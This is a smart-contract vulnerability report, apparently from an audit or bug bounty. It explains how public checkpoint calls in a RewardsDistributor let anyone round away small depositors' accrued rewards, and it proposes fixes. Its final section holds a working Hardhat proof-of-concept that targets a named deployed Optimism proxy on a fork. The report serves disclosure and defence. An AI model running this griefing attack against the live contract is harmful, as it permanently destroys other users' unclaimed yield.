### Title
Unprivileged reward checkpoints can permanently forfeit small depositors’ accrued rewards - (`contracts/RewardsDistributor.sol`)

### Summary
`RewardsDistributor.updateBeforeMintOrBurn()` is callable by any external account for any reward-bearing token and any victim account. [1](#0-0) 

Each call advances the token’s reward timestamp and updates the victim’s stored account index, even if the calculated reward delta is zero. [2](#0-1) 

Because rewards are only accumulated as integer reward-token units, splitting accrual into very small intervals can make each update round to zero or discard the fractional portion, preventing the victim’s accumulated entitlement from ever being recorded. [3](#0-2) 

### Finding Description
The global reward index is calculated as:

```solidity
_tokensAccrued = _deltaTimestamps * _speed;
_ratio = _tokensAccrued.wadDiv(_totalSupply);
``` [4](#0-3) 

`_updateTokenIndex()` then persists the new timestamp whenever `_newIndex` and `_newTimestamp` are nonzero; if `_ratio` is zero, the old positive index still satisfies `_newIndex > 0`, so the timestamp advances while the index does not. [5](#0-4) 

The victim-side calculation is:

```solidity
_deltaIndex = _tokenIndex - _accountIndex;
_tokensDelta = token_.balanceOf(account_).wadMul(_deltaIndex);
``` [6](#0-5) 

`wadMul()` rounds to the nearest integer reward-token unit. [3](#0-2) 

If `balance * deltaIndex < 0.5e18`, the update records zero rewards, but `_updateTokensAccruedOf()` still stores the latest index for the victim. [2](#0-1) 

Consequently, an attacker can call `updateBeforeMintOrBurn(token, victim)` once per block and prevent sub-unit accruals from ever accumulating into a nonzero claim. The public `claimRewards(address[], IERC20[])` path can also batch the same checkpointing behavior for multiple victims. [7](#0-6) 

The vulnerable functions have no caller or token-origin restriction. A token only needs a nonzero reward state, which is initialized when a nonzero speed is first configured. [8](#0-7) 

### Impact Explanation
The broken invariant is faithful reward accrual: a user’s claimable rewards should be proportional to their balance over the entire elapsed period, rather than being recalculated and rounded independently for attacker-selected intervals. [9](#0-8) 

For affected positions, the fractional reward for each forced interval is permanently discarded because the victim’s account index is advanced anyway. [10](#0-9) 

This is a persistent loss or freezing of unclaimed yield: the victim cannot later recover the fractions because the checkpoint corresponding to those fractions has already been consumed. The same mechanism can also make the global timestamp advance without a corresponding index increase when the interval-level `_ratio` rounds to zero. [11](#0-10) 

### Likelihood Explanation
The attack requires only an EOA and a public call to `RewardsDistributor.updateBeforeMintOrBurn()`; there is no `onlyPool`, token-caller, pause, or ownership check on that function. [12](#0-11) 

A valid target must be an already registered `DepositToken` or `DebtToken` with `tokenStates[token].index > 0`, a positive `tokenSpeed`, and a positive total supply. [13](#0-12) 

The attack is strongest against small positions, where the per-block reward is below the `wadMul()` rounding threshold. On low-fee L2 deployments, repeatedly checkpointing many accounts is inexpensive, and `claimRewards()` provides a batch path for multiple accounts. [14](#0-13) 

### Recommendation
Do not consume an account’s index when its computed delta rounds to zero. In `_updateTokensAccruedOf()`, leave `accountIndexOf[token][account]` unchanged when `_tokensDelta == 0`, or store accrued rewards at higher precision and carry the fractional remainder. [15](#0-14) 

Likewise, do not advance `TokenState.timestamp` when `_ratio` rounds to zero, or carry the sub-index remainder so that elapsed emissions are not discarded. [16](#0-15) 

Restrict `updateBeforeMintOrBurn()` and `updateBeforeTransfer()` to their legitimate token contracts, for example by requiring `_msgSender() == address(token_)` and validating that `token_` is a registered deposit or debt token. This prevents third parties from forcing checkpoint intervals for victims. [17](#0-16) 

### Proof of Concept
The following Hardhat test runs against an Optimism fork and uses the deployed OP rewards proxy at `0xEBe91F52766Dd236b6E8C1951f6a4a8Bcc47A71e`. [18](#0-17) 

```ts
import {expect} from 'chai'
import {ethers, network, time} from 'hardhat'
import {BigNumber} from 'ethers'

const REWARDS = '0xEBe91F52766Dd236b6E8C1951f6a4a8Bcc47A71e'

const REWARDS_ABI = [
  'function pool() view returns (address)',
  'function tokens(uint256) view returns (address)',
  'function tokenSpeeds(address) view returns (uint256)',
  'function tokenStates(address) view returns (uint224 index, uint32 timestamp)',
  'function updateBeforeMintOrBurn(address,address)',
  'function claimable(address) view returns (uint256)',
  'function tokensAccruedOf(address) view returns (uint256)',
]

const POOL_ABI = ['function feeCollector() view returns (address)']

const DEPOSIT_TOKEN_ABI = [
  'function totalSupply() view returns (uint256)',
  'function balanceOf(address) view returns (uint256)',
  'function unlockedBalanceOf(address) view returns (uint256)',
  'function transfer(address,uint256) returns (bool)',
]

describe('RewardsDistributor checkpoint griefing', function () {
  it('drops a small position’s fractional accrual every block', async function () {
    const [attacker, victim] = await ethers.getSigners()
    const distributor = await ethers.getContractAt(REWARDS_ABI, REWARDS)
    const pool = await ethers.getContractAt(POOL_ABI, await distributor.pool())
    const seedHolder = await pool.feeCollector()

    const WAD = BigNumber.from(10).pow(18)
    const interval = 2
    const periods = 10

    let selectedToken: any
    let victimBalance = BigNumber.from(0)

    // Select a live rewarded DepositToken where the per-interval index delta
    // permits a position whose per-interval reward is below 0.5 reward wei.
    for (let i = 0; ; i++) {
      let tokenAddress: string
      try {
        tokenAddress = await distributor.tokens(i)
      } catch {
        break
      }

      const token = await ethers.getContractAt(DEPOSIT_TOKEN_ABI, tokenAddress)
      const speed: BigNumber = await distributor.tokenSpeeds(tokenAddress)
      const state = await distributor.tokenStates(tokenAddress)
      const supply: BigNumber = await token.totalSupply()

      if (speed.isZero() || state.index.isZero() || supply.isZero()) continue

      let seedUnlocked: BigNumber
      try {
        seedUnlocked = await token.unlockedBalanceOf(seedHolder)
      } catch {
        // DebtToken is not transferable and has no unlockedBalanceOf().
        continue
      }

      const ratio = speed
        .mul(interval)
        .mul(WAD)
        .add(supply.div(2))
        .div(supply)

      // balance * ratio ~= 0.45e18, so wadMul() returns zero each interval.
      const candidateBalance = WAD.mul(45).div(100).div(ratio)

      if (!candidateBalance.isZero() && seedUnlocked.gte(candidateBalance)) {
        selectedToken = token
        victimBalance = candidateBalance
        break
      }
    }

    expect(selectedToken, 'no suitable rewarded DepositToken found').to.not.equal(undefined)

    // Fork-local setup: seed the victim with a legitimate small DepositToken
    // position. The exploit transaction itself is sent by an unrelated EOA.
    await network.provider.request({
      method: 'hardhat_impersonateAccount',
      params: [seedHolder],
    })
    await network.provider.send('hardhat_setBalance', [
      seedHolder,
      '0x1000000000000000000',
    ])

    await selectedToken
      .connect(await ethers.getSigner(seedHolder))
      .transfer(victim.address, victimBalance)

    await network.provider.request({
      method: 'hardhat_stopImpersonatingAccount',
      params: [seedHolder],
    })

    // First measure what the victim would accrue over 20 seconds if the
    // attacker did not fragment the accounting period.
    const snapshot = await network.provider.send('evm_snapshot')
    await time.increase(interval * periods)
    const uninterruptedClaimable = await distributor['claimable(address)'](
      victim.address
    )
    await network.provider.send('evm_revert', [snapshot])

    expect(uninterruptedClaimable).to.be.gt(0)

    // The attacker forces a fresh checkpoint every two-second interval.
    for (let i = 0; i < periods; i++) {
      const latest = await ethers.provider.getBlock('latest')
      await time.setNextBlockTimestamp(latest.timestamp + interval)

      await distributor
        .connect(attacker)
        .updateBeforeMintOrBurn(selectedToken.address, victim.address)

      // Each 0.45-wei accrual rounds to zero, while accountIndexOf[victim]
      // is still advanced to the latest global index.
      expect(await distributor.tokensAccruedOf(victim.address)).to.eq(0)
    }
  })
})
```

Run it on an Optimism fork:

```bash
npx hardhat node --fork "$OPTIMISM_RPC_URL"
npx hardhat test test/fork/RewardsDistributorGriefing.test.ts --network localhost
```

The test demonstrates that ten uninterrupted accrual periods produce a positive claimable amount, while ten attacker-forced checkpoints leave `tokensAccruedOf[victim]` at zero because each sub-half-wei delta is rounded away after the account index is advanced.
